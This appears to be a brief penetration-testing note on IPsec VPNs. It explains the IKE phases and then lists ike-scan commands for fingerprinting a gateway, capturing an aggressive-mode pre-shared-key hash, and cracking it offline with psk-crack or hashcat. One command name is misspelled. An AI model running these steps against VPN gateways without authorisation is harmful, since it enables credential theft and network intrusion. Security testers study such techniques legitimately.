# IKE

**IPsec** is widely recognized as the principal technology for securing communications between networks (LAN-to-LAN) and from remote users to the network gateway (remote access), serving as the backbone for enterprise VPN solutions.

The establishment of a **security association (SA)** between two points is managed by **IKE**, which operates under the umbrella of ISAKMP, a protocol designed for the authentication and key exchange. This process unfolds in several phases:

- **Phase 1:** A secure channel is created between two endpoints. This is achieved through the use of a Pre-Shared Key (PSK) or certificates, employing either main mode, which involves three pairs of messages, or **aggressive mode**.
- **Phase 1.5:** Though not mandatory, this phase, known as the Extended Authentication Phase, verifies the identity of the user attempting to connect by requiring a username and password.
- **Phase 2:** This phase is dedicated to negotiating the parameters for securing data with **ESP** and **AH**. It allows for the use of algorithms different from those in Phase 1 to ensure **Perfect Forward Secrecy (PFS)**, enhancing security.

**Default port:** 500/udp

Also commonly exposed: 4500/udp (NAT Traversal)

```zsh
ike-scan -M 172.16.21.200
```

If a handshake is returned, begin brute forcing IDs. Once retrieved obtain the PSK.
```zsh
sudo ik-escan -M -A -n GroupVPN -P hash.psk x.x.x.x
```

Once retrieved, it can cracked with hashcat or psk-crack
```zsh
psk-crack ike.hash 
# -B 8
```

References
---
https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html?highlight=ike#bruteforcing-id-with-ike-scan
https://github.com/isaudits/scripts/blob/master/iker.py